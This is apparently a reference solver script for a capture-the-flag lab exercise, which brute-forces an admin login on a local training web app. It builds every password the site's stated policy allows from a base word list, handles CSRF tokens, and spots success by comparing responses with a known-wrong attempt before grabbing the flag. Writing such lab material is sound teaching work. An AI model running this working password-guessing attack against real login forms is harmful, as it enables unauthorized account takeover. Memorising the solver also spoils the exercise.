#!/usr/bin/env python3
"""Operation 02 reference solver — Sledge cracks Castle's barricade.

This is COMPLETE ENUMERATION, not guessing. The password policy shown on
/op2/register is a rigid formula, not a vague composition rule:

    Capitalized word + exactly 2 digits + exactly 1 symbol from ! @ # $

That fully determines the shape of every candidate. Take a small profiled
base-word list and try every value the policy allows -- words x 100 x 4 -- and
the real password is guaranteed to be in that set. Nothing here is intuited.

The two things that make it non-trivial are still handled here:
  1. session + CSRF token   (naive tools send none and get 400s)
  2. self-calibrating success detection: we do NOT assume success is a 302 or a
     keyword. We first measure a KNOWN-WRONG login (the baseline), then flag any
     candidate whose response differs from it -- then confirm by reaching /console.

Usage: python3 op2.py [base_url]     (default http://localhost:8000)
"""
import sys, os, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "g.mendel"                       # the admin, confirmed back in Operation 01
WORDLIST = os.path.join(os.path.dirname(__file__), "..", "wordlists", "op2_base_words.txt")

DIGIT_COUNT = 2
SYMBOLS = "!@#$"


def generate_candidates(base_words):
    """The FULL cross-product the policy allows -- every word x every 2-digit
    value x every symbol. Complete enumeration, not a guessed subset."""
    digits = [f"{n:0{DIGIT_COUNT}d}" for n in range(10 ** DIGIT_COUNT)]
    for word in base_words:
        capped = word.strip().capitalize()
        if not capped:
            continue
        for d in digits:
            for s in SYMBOLS:
                yield f"{capped}{d}{s}"


def get_token(sess):
    r = sess.get(f"{BASE}/op2/")
    m = re.search(r'name="csrf_token" value="([0-9a-f]+)"', r.text)
    return m.group(1) if m else None


def attempt(sess, token, password):
    return sess.post(f"{BASE}/op2/login",
                     data={"csrf_token": token, "username": USER, "password": password},
                     allow_redirects=False)          # don't follow, so a redirect is visible


def fingerprint(r):
    """The signals we compare -- none of them assume what success looks like."""
    return (r.status_code, len(r.content), r.headers.get("Location"))


def main():
    base_words = [l.strip() for l in open(WORDLIST) if l.strip()]
    sess = requests.Session()
    token = get_token(sess)
    if not token:
        print("[!] could not read CSRF token — is the app up?"); return

    baseline = fingerprint(attempt(sess, token, "definitely-not-the-password-000"))
    print(f"[*] session up, csrf={token}")
    print(f"[*] baseline (known-wrong) = status {baseline[0]}, {baseline[1]} bytes, redirect={baseline[2]}")

    candidates = list(generate_candidates(base_words))
    print(f"[*] {len(base_words)} base words x 10^{DIGIT_COUNT} digits x {len(SYMBOLS)} symbols "
          f"= {len(candidates)} candidates (the FULL policy-allowed space)")
    print(f"[*] attacking {USER} (no lockout — hammer away)\n")

    for i, pw in enumerate(candidates, 1):
        r = attempt(sess, token, pw)
        if fingerprint(r) != baseline:              # anything unlike a known failure
            console = sess.get(f"{BASE}/op2/console")
            flag = re.search(r"R6S\{[^}]*\}", console.text)
            if flag:
                print(f"[+] CRACKED after {i}/{len(candidates)} tries: {USER}:{pw}")
                print(f"[+] response differed from baseline: {fingerprint(r)}")
                print(f"[+] OPERATION 02 FLAG: {flag.group(0)}")
                print("[+] Operation 03 is now unlocked at Command.")
                return
        if i % 1000 == 0:
            print(f"    ...{i}/{len(candidates)} tried")
    print("[!] full policy-allowed space exhausted without a hit — check the base word list")


if __name__ == "__main__":
    main()
